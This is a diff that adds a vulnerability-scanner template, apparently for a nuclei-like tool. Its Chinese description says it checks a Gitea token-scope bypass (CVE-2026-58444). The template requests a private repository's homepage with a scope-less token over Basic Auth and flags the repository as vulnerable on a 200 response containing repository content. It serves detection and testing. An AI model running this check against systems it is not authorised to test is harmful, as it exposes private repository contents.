@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "检测 Gitea 仓库主页路由 GET /{owner}/{repo} 的 PAT/OAuth2 令牌作用域绕过漏洞：使用无 repository 作用域的令牌通过 HTTP Basic Auth 访问私有仓库主页，若返回 200 且包含私有仓库内容（README、文件树等）则存在漏洞"
+id = "POC-AVE-2026-0680"
+name = "CVE-2026-58444 PoC"
+severity = "medium"
+tags = ["ave-2026-0680"]
+vuln_id = [
+    "CVE-2026-58444",
+    "AVE-2026-0680",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}/{{Repo}}"
+protocol = "http"
+
+[[poc.requests.extractors]]
+group = 1
+name = "repo_name"
+part = "body"
+regex = "<title>([^<]+)</title>"
+type = "regex"
+value = "<title>([^<]+)</title>"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Auth}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "README",
+    "file tree",
+    "repository",
+    "commits",
+    "branches",
+    "releases",
+]
